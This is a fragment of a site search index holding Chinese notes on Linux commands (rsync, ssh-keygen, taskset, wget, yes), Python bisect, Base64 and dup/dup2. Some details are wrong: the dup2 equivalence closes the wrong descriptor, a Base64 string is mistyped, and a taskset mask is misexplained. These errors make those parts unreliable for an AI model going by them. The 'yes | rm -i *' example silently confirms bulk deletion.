从远程rsync服务器中拷贝文件到本地机。 当SRC路径信息包含\"::\"分隔符时启动该模式. 如: rsync -av root@192.168.78.192::www /databack 本地->远程rsync服务 从本地机器拷贝文件到远程rsync服务器中。 当DST路径信息包含\"::\"分隔符时启动该模式. 如: rsync -av /databack root@192.168.78.192::www 列远程机的文件列表 类似于rsync传输，不过只要在命令中省略掉本地机信息即可. 如: rsync -v rsync://192.168.78.192/www 选项 -v , --verbose 详细模式输出, 可以打印一些信息，比如文件列表、文件数量等 -q , --quiet 精简输出模式。 -c , --checksum 打开校验开关，强制对文件传输进行校验。 -a , --archive 归档模式，表示以递归方式传输文件，并保持所有文件属性，等于 -rlptgoD -a 选项后面可以跟一个 --no-OPTION，表示关闭 -r、-l、-p、-t、-g、-o、-D 中的某一个，比如: -a --no-l 等同于: -r、-p、-t、-g、-o、-D 选项。 -r , --recursive 表示以递归模式处理子目录，它主要是针对目录来说的， 如果单独传一个文件不需要加 -r 选项，但是传输目录时必须加 -R , --relative 使用相对路径信息。 -b , --backup 创建备份，也就是对于目的已经存在有同样的文件名时， 将老的文件重新命名为~filename。可以使用 --suffix 选项来指定不同的备份文件前缀。 --backup-dir 将备份文件(如~filename)存放在在目录下。 --suffix= <SUFFIX> 定义备份文件前缀(好像只有一个杠-suffix)。 -u , --update 仅仅进行更新，也就是跳过所有已经存在于DST，并且文件时间晚于要备份的文件， 或者说把 DEST 中比 SRC 还新的文件排除掉，不会覆盖 -l , --links 保留软链接 -L , --copy-links 表示像对待常规文件一样处理软链接. 如果是 SRC 中有软链接文件，则加上该选项后，将会把软连接指向的目标文件复制到 DEST --copy-unsafe-links 仅仅拷贝指向SRC路径目录树以外的链接 --safe-links 忽略指向SRC路径目录树以外的链接。 -H , --hard-links 保留硬链接。 -p , --perms 保持文件权限 -o , --owner 保持文件属主信息 -g , --group 保持文件属组信息 -D , --devices 保持设备文件信息 -t , --times 保持文件时间信息 -S , --sparse 对稀疏文件进行特殊处理以节省DST的空间。 -n , --dry-run 显示哪些文件将被传输。 -w , --whole-file 拷贝文件，不进行增量检测。 -x , --one-file-system 不要跨越文件系统边界。 -B , --block-size= SIZE 检验算法使用的块尺寸，默认是700字节。 -e , --rsh= command 指定使用rsh、ssh方式进行数据同步。 --rsync-path= PATH 指定远程服务器上的rsync命令所在路径信息。 -C , --cvs-exclude 使用和CVS一样的方法自动忽略文件，用来排除那些不希望传输的文件。 --existing 仅仅更新那些已经存在于DST的文件，而不备份那些新创建的文件。 --delete 删除那些 DST 中 SRC 没有的文件 --delete-excluded 同样删除接收端那些被该选项指定排除的文件。 --delete-after 传输结束以后再删除。 --ignore-errors 及时出现IO错误也进行删除。 --max-delete= NUM 最多删除NUM个文件。 -P , --partial 保留那些因故没有完全传输的文件，加快随后的再次传输. 参数允许恢复中断的传输. 不使用该参数时, rsync 会删除传输到一半被打断的文件 使用该参数后，传输到一半的文件也会同步到目标目录，下次同步时再恢复中断的传输。 一般需要与 --append 或 --append-verify 配合使用 --force 强制删除目录，即使不为空。 --numeric-ids 不将数字的用户和组id匹配为用户名和组名。 --timeout= time ip超时时间，单位为秒。 -I , --ignore-times 不跳过那些有同样的时间和长度的文件。 --size-only 当决定是否要备份文件时，仅仅察看文件大小而不考虑文件时间。 --modify-window= NUM 决定文件是否时间相同时使用的时间戳窗口，默认为0。 -T , --temp-dir= DIR 在DIR中创建临时文件。 --compare-dest= DIR 同样比较DIR中的文件来决定是否需要备份 -z , --compress 对备份的文件在传输时进行压缩处理 --exclude= PATTERN 指定排除不需要传输的文件模式, 等号后面跟文件名，可以是通配符模式（如 *.txt ） --include= PATTERN 指定不排除而需要传输的文件模式。 --exclude-from= FILE 排除FILE中指定模式的文件。 --include-from= FILE 不排除FILE指定模式匹配的文件。 --version 打印版本信息。 --address 绑定到特定的地址。 --config= FILE 指定其他的配置文件，不使用默认的rsyncd.conf文件。 --port= PORT 指定其他的rsync服务端口。 --blocking-io 对远程shell使用阻塞IO。 -s tats 给出某些文件的传输状态。 --progress 表示在同步的过程中可以看到同步的过程状态，比如统计要同步的文件数量、 同步的文件传输速度等 --log-format= formAT 指定日志文件格式。 --password-file= FILE 从FILE中得到密码。 --bwlimit= KBPS 限制I/O带宽，KBytes per second -h , --help 显示帮助信息 --append 参数指定文件接着上次中断的地方，继续传输 --append-verify 参数跟 --append 参数类似，但会对传输完成后的文件进行一次校验。 如果校验失败，将重新发送整个文件。 对于初学者来说，记住最常用的几个即可，比如 -a、-v、-z、--delete 和 --exclude。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-rsync.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-rsync.html"},{"title":"script","text":"创建终端会话的 text/x-script , 记录终端会话并生成可重播的脚本 用法: script [option] [file] 支持的选项: -a , --append 增加到输出. 在现有输出录制的文件的内容上追加新的内容 -c , --command <command> 直接执行给定的command指令而不是启动一个交互式终端. -r 子进程中返回退出代码 -e , --return return exit code of the child process -f , --flush run flush after each write 如果需要在输出到日志文件的同时，也可以查看日志文件的内容 ，可以使用 -f 参数 PS:可以用于教学,两个命令行接-f可以实时演示 --force use output file even when it is a link -q , --quiet be quiet. 使script命令以静默模式运行 -V , --version output version information and exit. 输出script的版本信息，然后退出 -h , --help display this help and exit 输出script的帮助信息，然后退出. -t, --timing[=<file>] output timing data to stderr (or to FILE). 指明输出录制的时间数据 如, 记录终端的输出到文件: script -c \"pv some_file.txt\" /tmp/out.cast 结合用例说明 script 指令可以用来记录终端会话并生成可重播的脚本。 使用script时,它会创建一个类型为text/x-script的文件,这个文件中包含了你在终端中所有操作的记录,包括输入和输出。 例如: script demo.script 这将启动 script,并将你的终端记录写入 demo.script 文件。 在这个会话结束后,demo.script 就包含了一个可以重播你所有操作的脚本。 可以用如下命令回放这个会话脚本: scriptreplay demo.script 它将逐步重现你之前在终端中的所有操作。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-script.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-script.html"},{"title":"rz","text":"在终端下载本地文件 相关指令 sz","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-serious.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-serious.html"},{"title":"ssh-keygen","text":"生成公私密钥 如生成rsa秘钥: ssh-keygen -t rsa 还有个可以配对使用的, 复制公钥到需要的主机，或其它方式发送公钥过去改名为authorized_keys: ssh-copy-id user@host 注解 ssh远程登录并执行指令的时候，authorized里的command参数需要加上 &/bin/bash 保持登陆: #authorized_keys command=\"ls -al & /bin/bash\" 更多可见 https://blog.csdn.net/alifrank/article/details/48241699 参数选项 -m 指定密钥的格式，PEM（也就是RSA格式）是之前使用的旧格式 -b 指定密钥长度； -e 读取openssh的私钥或者公钥文件； -C 添加注释； -f 指定用来保存密钥的文件名； -i 读取未加密的ssh-v2兼容的私钥/公钥文件，然后在标准输出设备上显示openssh兼容的私钥/公钥； -l 显示公钥文件的指纹数据； -N 提供一个新密语； -P 提供（旧）密语； -q 静默模式； -t 指定要创建的密钥类型 关于authorized_keys与authorized_keys2 authorized_keys vs authorized_keys2 In OpenSSH releases earlier than 3, the sshd man page said: The $HOME/.ssh/authorized_keys file lists the RSA keys that are permitted for RSA authentication in SSH protocols 1.3 and 1.5 Similarly, the $HOME/.ssh/authorized_keys2 file lists the DSA and RSA keys that are permitted for public key authentication (PubkeyAuthentication) in SSH protocol 2.0. 也就是说在ssh的3版本之前: authorized_keys2多支持一个DSA加密算法 中文翻译: 在版本3之前的OpenSSH中，sshd手册页曾经说过： > $ HOME / .ssh / authorized_keys文件列出了SSH协议1.3和1.5中允许进行RSA身份验证的RSA密钥。 类似地，$ HOME / .ssh / authorized_keys2文件列出了允许进行公共密钥身份验证的DSA和RSA密钥（ SSH协议2.0中的PubkeyAuthentication）。 版本3 的 发行公告 指出已弃用authorized_keys2，并且所有密钥都应放在authorized_keys文件中。 实际使用过程中openssl 1.1.1的版本中即使只有一个authorized_keys2也可以使用的（其他版本未测试） 登录执行指令 在公钥文件前加上: command=\"/bin/sh xxx.sh\" $pub_key 关于rsa格式秘钥在高版本的生成 现在使用命令 ssh-keygen -t rsa 生成ssh，默认是以新的格式生成， id_rsa的第一行变成了 \"BEGIN OPENSSH PRIVATE KEY\" 而不在是 \"BEGIN RSA PRIVATE KEY\" ， 此时用来msyql、MongoDB，配置ssh登陆的话， 可能会报 \"Resource temporarily unavailable. Authentication by key (/Users/youname/.ssh/id_rsa) failed (Error -16). (Error #35)\" 提示资源不可用，这就是id_rsa 格式不对造成的 解决方法（一）： 使用 ssh-keygen -m PEM -t rsa -b 4096 来生成 注解 -m PEM 指定密钥的格式，PEM（也就是RSA格式）是之前使用的旧格式 -b 4096 指定密钥长度为4096 -t rsa 指定要创建的密钥类型为RSA 原文链接： https://blog.csdn.net/lsp84ch80/article/details/87861990","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-ssh-keygen.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-ssh-keygen.html"},{"title":"stdbuf","text":"读取管道文件 -i 调整标准输入流缓冲区 -o 调整标准输出流缓冲区 -e 标准错误流缓冲区 L 行缓冲模式","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-stdbuf.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-stdbuf.html"},{"title":"tail","text":"显示指定文件的末尾若干行 -n<N>, ——line=<N> 输出文件的尾部N（N位数字）行内容 -f 显示最新内容","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-tail.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-tail.html"},{"title":"taskset","text":"taskset命令用于设置进程（或 线程）的处理器亲和性（Processor Affinity）， 可以将进程（或 线程）绑定到特定的一个 或 多个CPU上去执行， 而不允许将进程（或 线程）调度到其他的CPU上。 将进程绑定到指定的CPU上运行，这样可以避免大量的进程切换产生的无效时间。 通过 taskset 命令可将某个进程与某个CPU核心绑定，使得其仅在与之绑定的CPU核心上运行。 线程是最小的内核执行调度单元，因此，准确地说是将某个线程与某个CPU核心绑定，而非某个进程。 taskset命令是依据线程PID（TID）查询或设置线程的CPU亲和性（与哪个CPU核心绑定）。 常用参数 -a , --all-tasks 设置或检索所有任务（线程）的CPU相关性对于给定的PID -c , --cpu-list 将掩码解释为处理器的数字列表 -p , --pid 在现有PID上操作，不要启动新任务 -V , --version 显示版本信息 -h , --help 显示帮助信息 例子: [root@localhost ~]# ps -eLf | grep qemu root 1389 1339 1389 0 3 14:48 pts/0 00:00:10 /usr/libexec/qemu-kvm -cpu SandyBridge -vnc 0.0.0.0:1 centos1708.img root 1389 1339 1393 2 3 14:48 pts/0 00:00:36 /usr/libexec/qemu-kvm -cpu SandyBridge -vnc 0.0.0.0:1 centos1708.img root 1389 1339 1395 0 3 14:48 pts/0 00:00:00 /usr/libexec/qemu-kvm -cpu SandyBridge -vnc 0.0.0.0:1 centos1708.img root 2638 1409 2638 0 1 15:10 pts/1 00:00:00 grep --color=auto qemu [root@localhost ~]# taskset -p 1393 pid 1393's current affinity mask: ff [root@localhost ~]# taskset -p 1389 pid 1389's current affinity mask: ff 输出结构处理器亲和性掩码是ff，表示进程（或 线程）可以在Host上让任何一个CPU运行。 查看进程（或 线程）允许允许CPU范围使用 -c 参数。 由于我的Host CPU是4核2线程，因此有8颗逻辑CPU: [root@localhost ~]# taskset -cp 1393 pid 1393's current affinity list: 0-7 [root@localhost ~]# taskset -cp 1389 pid 1389's current affinity list: 0-7 更改具体某一进程（或 线程）CPU亲和性 指令: taskset -p hexadecimal mask PID/LWP 上面1393号线程可以在0~7号CPU之间允许，现在设置掩码0x11（二进制0001 0001），表示可以在0~4号CPU上允许: [root@localhost ~]# taskset -p 0x11 1393 pid 1393's current affinity mask: ff pid 1393's new affinity mask: 11 [root@localhost ~]# taskset -p 1393 pid 1393's current affinity mask: 11 [root@localhost ~]# taskset -cp 1393 pid 1393's current affinity list: 0,4 为具体某一进程（或 线程）CPU亲和性指定一组范围 使用-c参数: [root@localhost ~]# taskset -cp 0,3 1393 pid 1393's current affinity list: 0,4 pid 1393's new affinity list: 0,3 [root@localhost ~]# taskset -cp 1393 pid 1393's current affinity list: 0,3","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-taskset.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-taskset.html"},{"title":"trap","text":"指定在接收到信号之后将要采取的动作 用法: trap \"动作\" \"信号\" 支持的信号见: /docs/操作系统/linux/概念性/linux系统信号 例如，收到0信号执行 exit 1 trap \"exit 1\" 0 与set协作 /docs/操作系统/linux/linux指令/set 支持在脚本执行错误时退出, 那如果要在退出时候打印一些消息或者清理应该如何做? set -e 在检查到命令异常返回时并没有信号的产生, 故trap指令就不能写信号了, 而是写bash内置定义的 ERR (不区分大小写): #!/bin/bash error_exit() { echo \"error, exit\" } set -e trap error_exit ERR echo 1 ss echo 2 echo 3 注解 dash中貌似没有内置对ERR的支持 对ERR的说明: 在 Bash 中，ERR 并不是一个具体的信号。在错误检测机制中，ERR 是对发生错误退出的状态的引用. 虽然 ERR 不是一个实际的信号，但它可以被 trap 命令捕获和处理.","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-trap.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-trap.html"},{"title":"userdel","text":"-f 强制删除 即使登陆 -r 删除时 删除所有相关文件","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-userdel.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-userdel.html"},{"title":"watch","text":"周期执行给定的指令: watch （选项） （参数） 选项 -n , --interval watch缺省每2秒运行一下程序，可以用-n或-interval来指定间隔的时间。 -d , --differences 用-d或--differences 选项watch 会高亮显示变化的区域。 而-d=cumulative选项会把变动过的地方(不管最近的那次有没有变动)都高亮显示出来。 -t , -n o-title 会关闭watch命令在顶部的时间间隔,命令，当前时间的输出。 -h , --help 查看帮助文档","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-watch.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-watch.html"},{"title":"wget","text":"从指定的URL下载文件。 wget非常稳定，它在带宽很窄的情况下和不稳定网络中有很强的适应性， 如果是由于网络的原因下载失败，wget会不断的尝试，直到整个文件下载完毕。 如果是服务器打断下载过程，它会再次联到服务器上从停止的地方继续下载。 这对从那些限定了链接时间的服务器上下载大文件非常有用。 wget支持HTTP，HTTPS和FTP协议，可以使用HTTP代理。 所谓的自动下载是指，wget可以在用户退出系统的之后在后台执行。 这意味这你可以登录系统，启动一个wget下载任务，然后退出系统， wget将在后台执行直到任务完成， 相对于其它大部分浏览器在下载大量数据时需要用户一直的参与，这省去了极大的麻烦。 用于从网络上下载资源，没有指定目录，下载资源回默认为当前目录。 wget虽然功能强大，但是使用起来还是比较简单： 支持断点下传功能 这一点，也是网络蚂蚁和FlashGet当年最大的卖点， 现在，Wget也可以使用此功能，那些网络不是太好的用户可以放心了； 同时支持FTP和HTTP下载方式 尽管现在大部分软件可以使用HTTP方式下载，但是，有些时候，仍然需要使用FTP方式下载软件； 支持代理服务器 对安全强度很高的系统而言，一般不会将自己的系统直接暴露在互联网上， 所以，支持代理是下载软件必须有的功能； 设置方便简单 可能，习惯图形界面的用户已经不是太习惯命令行了， 但是，命令行在设置上其实有更多的优点，最少，鼠标可以少点很多次，也不要担心是否错点鼠标； 程序小，完全免费 程序小可以考虑不计，因为现在的硬盘实在太大了； 完全免费就不得不考虑了，即使网络上有很多所谓的免费软件，但是，这些软件的广告却不是我们喜欢的。 语法 : wget [参数] [URL地址] 选项 启动参数： -V, –-version 显示wget的版本后退出 -h, –-help 打印语法帮助 -b, –-background 启动后转入后台执行 -e, –-execute=COMMAND 执行 .wgetrc 格式的命令， wgetrc格式参见/etc/wgetrc或~/.wgetrc 记录和输入文件参数： -o, –-output-file=FILE 把记录写到FILE文件中 -a, –-append-output=FILE 把记录追加到FILE文件中 -d, –-debug 打印调试输出 -q, –-quiet 安静模式(没有输出) -v, –-verbose 冗长模式(这是缺省设置) -nv, –-non-verbose 关掉冗长模式，但不是安静模式 -i, –-input-file=FILE 下载在FILE文件中出现的URLs -F, –-force-html 把输入文件当作HTML格式文件对待 -B, –-base=URL 将URL作为在-F -i参数指定的文件中出现的相对链接的前缀 –-sslcertfile=FILE 可选客户端证书 –-sslcertkey=KEYFILE 可选客户端证书的KEYFILE –-egd-file=FILE 指定EGD socket的文件名 下载参数： –-bind-address=ADDRESS 指定本地使用地址(主机名或IP，当本地有多个IP或名字时使用) -t, –-tries=NUMBER 设定最大尝试链接次数(0 表示无限制). -O –-output-document=FILE 把文档写到FILE文件中 -nc, –-no-clobber 不要覆盖存在的文件或使用.#前缀 -c, –-continue 接着下载没下载完的文件 –progress=TYPE 设定进程条标记 -N, –-timestamping 不要重新下载文件除非比本地文件新 -S, –-server-response 打印服务器的回应 –-spider 不下载任何东西 -T, –-timeout=SECONDS 设定响应超时的秒数 -w, –-wait=SECONDS 两次尝试之间间隔SECONDS秒 –waitretry=SECONDS 在重新链接之间等待1…SECONDS秒 –random-wait 在下载之间等待0…2*WAIT秒 -Y, –-proxy=on/off 打开或关闭代理 -Q, –-quota=NUMBER 设置下载的容量限制 –limit-rate=RATE 限定下载输率 目录参数： -nd –-no-directories 不创建目录 -x, –-force-directories 强制创建目录 -nH, –-no-host-directories 不创建主机目录 -P, –-directory-prefix=PREFIX 将文件保存到目录 PREFIX/… –cut-dirs=NUMBER 忽略 NUMBER层远程目录 HTTP 选项参数： -–http-user=USER 设定HTTP用户名为 USER. -–http-passwd=PASS 设定http密码为 PASS -C, –-cache=on/off 允许/不允许服务器端的数据缓存 (一般情况下允许) -E, –-html-extension 将所有text/html文档以.html扩展名保存 -–ignore-length 忽略 Content-Length 头域 -–header=STRING 在headers中插入字符串 STRING -–proxy-user=USER 设定代理的用户名为 USER -–proxy-passwd=PASS 设定代理的密码为 PASS -–referer=URL 在HTTP请求中包含 Referer: URL 头 -s, –-save-headers 保存HTTP头到文件 -U, –-user-agent=AGENT 设定代理的名称为 AGENT而不是 Wget/VERSION -–no-http-keep-alive 关闭 HTTP活动链接 (永远链接) –-cookies=off 不使用 cookies –-load-cookies=FILE 在开始会话前从文件 FILE中加载cookie -–save-cookies=FILE 在会话结束后将 cookies保存到 FILE文件中 FTP 选项参数： -nr, -–dont-remove-listing 不移走 .listing 文件 -g, -–glob=on/off 打开或关闭文件名的 globbing机制 -–passive-ftp 使用被动传输模式 (缺省值). -–active-ftp 使用主动传输模式 -–retr-symlinks 在递归的时候，将链接指向文件(而不是目录) 递归下载参数： -r, -–recursive 递归下载－－慎用! -l, -–level=NUMBER 最大递归深度 (inf 或 0 代表无穷) –-delete-after 在现在完毕后局部删除文件 -k, –-convert-links 转换非相对链接为相对链接 -K, –-backup-converted 在转换文件X之前，将之备份为 X.orig -m, –-mirror 等价于 -r -N -l inf -nr -p, –-page-requisites 下载显示HTML文件的所有图片 递归下载中的包含和不包含(accept/reject)： -A, –-accept=LIST 分号分隔的被接受扩展名的列表 -R, –-reject=LIST 分号分隔的不被接受的扩展名的列表 -D, –-domains=LIST 分号分隔的被接受域的列表 –-exclude-domains=LIST 分号分隔的不被接受的域的列表 –-follow-ftp 跟踪HTML文档中的FTP链接 –-follow-tags=LIST 分号分隔的被跟踪的HTML标签的列表 -G, –-ignore-tags=LIST 分号分隔的被忽略的HTML标签的列表 -H, –-span-hosts 当递归时转到外部主机 -L, –-relative 仅仅跟踪相对链接 -I, –-include-directories=LIST 允许目录的列表 -X, –-exclude-directories=LIST 不被包含目录的列表 -np, –-no-parent 不要追溯到父目录 wget -S –-spider url 不下载只显示过程 --limit-rate=300k 限制带宽为300k","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-wett.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-wett.html"},{"title":"whereis","text":"查找环境变量中的文件 -l 列出whereis会去查询的几个目录 -b 只找binary格式文件 -m 只找在说明文件manual路径下文件 -s 只找source来源文件 -u 搜寻不在上述三个项目中的其他文件","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-whereis.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-whereis.html"},{"title":"wireshark","text":"图形接口封包的获取，与 /docs/操作系统/linux/linux指令/tcpdump 的区别是tcpdump是文字接口封包获取 这玩意儿好像是一个软件","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-wireshark.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-wireshark.html"},{"title":"yes","text":"一直输出y换行, 对于有些交互式的指令且需要输入y来确认时可以使用, 比如: yes | apt install ssh 效果等价于: apt install ssh -y yes命令用于重复输出字符串（output a string repeatedly until killed）。 这个命令可以帮你自动回答命令行提示， 例如，进入一个含有多个文件的目录，执行: yes | rm -i * 所有的: rm: remove regular empty file `xxx'? 提示都会被自动回答 y。这在编写脚本程序的时候会很用处。 yes命令还有另外一个用途，可以用来生成大的文本文件。（-i交互式） 参数 i 会交互式询问 yes 后面直接跟单词或者字符表示一直输出这个","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-yes.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-yes.html"},{"title":"bisect","text":"bisect --- 数组二分查找算法 官网: https://docs.python.org/zh-cn/3/library/bisect.html 这个模块对有序列表提供了支持，使得他们可以在插入新数据仍然保持有序。 对于长列表，如果其包含元素的比较操作十分昂贵的话，这可以是对更常见方法的改进。 这个模块叫做 bisect 因为其使用了基本的二分（bisection）算法。源代码也可以作为很棒的算法示例（边界判断也做好啦！） 支持的函数 当使用 bisect() 和 insort() 编写时间敏感的代码时，请记住以下概念: 二分法对于搜索一定范围的值是很高效的。 对于定位特定的值，则字典的性能更好。 insort() 函数的时间复杂度为 O(n) 因为对数时间的搜索步骤被线性时间的插入步骤所主导。 这些搜索函数都是无状态的并且会在它们被使用后丢弃键函数的结果。 因此，如果在一个循环中使用搜索函数，则键函数可能会在同一个数据元素上被反复调用。 如果键函数速度不快，请考虑用 functools.cache() 来包装它以避免重复计算。 另外，也可以考虑搜索一个预先计算好的键数组来定位插入点。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-bisect.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-bisect.html"},{"title":"Base64编码","text":"编码表: | **索引** | **对应字符** | **索引** | **对应字符** | **索引** | **对应字符** | **索引** | **对应字符** | | ------ | -------- | ------ | -------- | ------ | -------- | ------ | -------- | | 0 | **A** | 17 | **R** | 34 | **i** | 51 | **z** | | 1 | **B** | 18 | **S** | 35 | **j** | 52 | **0** | | 2 | **C** | 19 | **T** | 36 | **k** | 53 | **1** | | 3 | **D** | 20 | **U** | 37 | **l** | 54 | **2** | | 4 | **E** | 21 | **V** | 38 | **m** | 55 | **3** | | 5 | **F** | 22 | **W** | 39 | **n** | 56 | **4** | | 6 | **G** | 23 | **X** | 40 | **o** | 57 | **5** | | 7 | **H** | 24 | **Y** | 41 | **p** | 58 | **6** | | 8 | **I** | 25 | **Z** | 42 | **q** | 59 | **7** | | 9 | **J** | 26 | **a** | 43 | **r** | 60 | **8** | | 10 | **K** | 27 | **b** | 44 | **s** | 61 | **9** | | 11 | **L** | 28 | **c** | 45 | **t** | 62 | **+** | | 12 | **M** | 29 | **d** | 46 | **u** | 63 | **/** | | 13 | **N** | 30 | **e** | 47 | **v** | | | | 14 | **O** | 31 | **f** | 48 | **w** | | | | 15 | **P** | 32 | **g** | 49 | **x** | | | | 16 | **Q** | 33 | **h** | 50 | **y** | | | 例子： 转换前 10101101,10111010,01110110 转换后 00101011, 00011011 ,00101001 ,00110110 十进制 43 27 41 54 对应码表中的值 r b p 2 所以上面的24位编码，编码后的Base64值为 rbp2 解码同理，把 rbq2 的二进制位连接上再重组得到三个8位值，得出原码。 （解码只是编码的逆过程，有关MIME的RFC还有很多，如果需要详细情况请自行查找。） 过程： 第一个字节，根据源字节的第一个字节处理。 规则：源第一字节右移两位，去掉低2位，高2位补零。 既：00 + 高6位 第二个字节，根据源字节的第一个字节和第二个字节联合处理。 规则如下，第一个字节高6位去掉然后左移四位，第二个字节右移四位 即：源第一字节低2位 + 源第2字节高4位 第三个字节，根据源字节的第二个字节和第三个字节联合处理， 规则第二个字节去掉高4位并左移两位（得高6位），第三个字节右移6位并去掉高6位（得低2位），相加即可 第四个字节，规则，源第三字节去掉高2位即可: //用更接近于编程的思维来说，编码的过程是这样的： //第一个字符通过右移2位获得第一个目标字符的Base64表位置，根据这个数值取到表上相应的字符，就是第一//个目标字符。 //然后将第一个字符与0x03(00000011)进行与(&)操作并左移4位,接着第二个字符右移4位与前者相或(|)，即获得第二个目标字符。 //再将第二个字符与0x0f(00001111)进行与(&)操作并左移2位,接着第三个字符右移6位与前者相或(|)，获得第三个目标字符。 //最后将第三个字符与0x3f(00111111)进行与(&)操作即获得第四个目标字符。 //在以上的每一个步骤之后，再把结果与 0x3F 进行 AND [位操作](https://baike.baidu.com/item/位操作) ，就可以得到编码后的字符了。 原文的字节数量应该是3的倍数，如果这个条件不能满足的话，具体的解决办法是这样的： 原文剩余的字节根据编码规则继续单独转(1变2，2变3；不够的位数用0补全)，再用=号补满4个字节。 这就是为什么有些Base64编码会以一个或两个等号结束的原因，但等号最多只有两个。 因为一个原字节至少会变成两个目标字节，所以余数任何情况下都只可能是0，1，2这三个数中的一个。 如果余数是0的话，就表示原文字节数正好是3的倍数（最理想的情况）。 如果是1的话，转成2个Base64编码字符，为了让Base64编码是4的倍数，就要补2个等号； 同理，如果是2的话，就要补1个等号。 原理：三个字节的八个字符 = 四个字节的六个字符 （3*8=4*6） 流程： 1、将字符转为ascii 2、将ascii转为二进制 3、原有的三字节在这里以源一、二、三代表 转换后的第一个字节：00 + 源一的高六位字符 转换后的第二个字节：00 + 源一的低二位字符 + 源二的高四位字符 转换后的第三个字节：00 + 源二的低四位字符 + 源三的高二位字符 转换后的第四个字节：00 + 源三的低六位字符 4、转换的二进制转换为十进制，根据编码表编码 注意：转换后的编码默认每76个字符换行，若不需换行，shell中 base64 -w 0即可: base64 # 编码 base64 -w num # 指定以多少个字符换行，为0则并不换行 base64 -d # 解码","tags":"杂乱无章","url":"/yq-doc-source-docs-Chaotic-Base64-encoding.html","loc":"/yq-doc-source-docs-Chaotic-Base64-encoding.html"},{"title":"dup","text":"dup()用来复制参数oldfd 所指的文件描述词, 并将它返回. 此新的文件描述词和参数oldfd 指的是同一个文件, 共享所有的锁定、读写位置和各项权限或旗标. 例如, 当利用lseek()对某个文件描述词作用时, 另一个文件描述词的读写位置也会随着改变. 不过, 文件描述词之间并不共享close-on-exec 旗标. 返回值 当复制成功时, 则返回最小及尚未使用的文件描述词. 若有错误则返回-1, errno 会存放错误代码. dup与dup2 APUE和man文档都用一句话简明的说出了这两个函数的作用: 复制一个现存的文件描述符 #include <unistd.h> int dup(int oldfd); int dup2(int oldfd, int newfd);123 当调用dup函数时，内核在进程中创建一个新的文件描述符， 此描述符是当前可用文件描述符的最小数值，这个文件描述符指向oldfd所拥有的文件表项。 dup2和dup的区别就是可以用newfd参数指定新描述符的数值， 如果newfd已经打开，则先将其关闭。 如果newfd等于oldfd，则dup2返回newfd, 而不关闭它。dup2函数返回的新文件描述符同样与参数oldfd共享同一文件表项。 APUE用另外一个种方法说明了这个问题: 实际上，调用dup(oldfd)等效于， fcntl(oldfd, F_DUPFD, 0) 而调用dup2(oldfd, newfd)等效于， close(oldfd)；fcntl(oldfd, F_DUPFD, newfd)； 注解 整理的时候发现以及不记得当初是为什么查这个了","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Built--in-function-dup.html","loc":"/yq-doc-source-docs-operating-system-linux-Built--in-function-dup.html"},{"title":"dup2","text":"dup2()用来复制参数oldfd 所指的文件描述词, 并将它拷贝至参数newfd 后一块返回. 若参数newfd为一已打开的文件描述词, 则newfd 所指的文件会先被关闭. dup2()所复制的文件描述词, 与原来的文件描述词共享各种文件状态, 详情可参考 /docs/操作系统/linux/内置函数/dup 返回值 当复制成功时, 则返回最小及尚未使用的文件描述词. 若有错误则返回-1, errno 会存放错误代码.","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Built--in-function-dup2.html","loc":"/yq-doc-source-docs-operating-system-linux-Built--in-function-dup2.html"},{"title":"getcwd","text":"获取当前目录 getcwd() failed 报错: sh: 0: getcwd() failed: No such file or directory 在一个不存在的目录上执行命令，会报上述错误， 这个目录是曾经存在， 后来给删除了，但某些管理工具的命令还存在于这个目录下执行。会报上述错误 方法是 换目录","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Built--in-function-getcwd.html","loc":"/yq-doc-source-docs-operating-system-linux-Built--in-function-getcwd.html"},{"title":"wait","text":"Linux内核学习笔记 - wait、waitpid、wait3 和 wait4 Linux下有四个wait函数： wait() 当进程调用wait时，会暂停目前进程的执行（即阻塞），由wait() 来自动分析是否当前进程的某个子进程已退出， 如果找到了一个已经变成变成僵尸进程的子进程，wait 就会收集这个子进程的信息，并将其彻底销毁后返回； 如果没有找到这样一个子进程，wait 就会一直阻塞在这里，直到出现僵尸进程。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Built--in-function-wait.html","loc":"/yq-doc-source-docs-operating-system-linux-Built--in-function-wait.html"},{"title":"颜色表与代码表","text":"颜色表 前景 背景 颜色 30 40 黑色 31 41 紅色 32 42 綠色 33 43 黃色 34 44 藍色 35 45 紫紅色 36 46 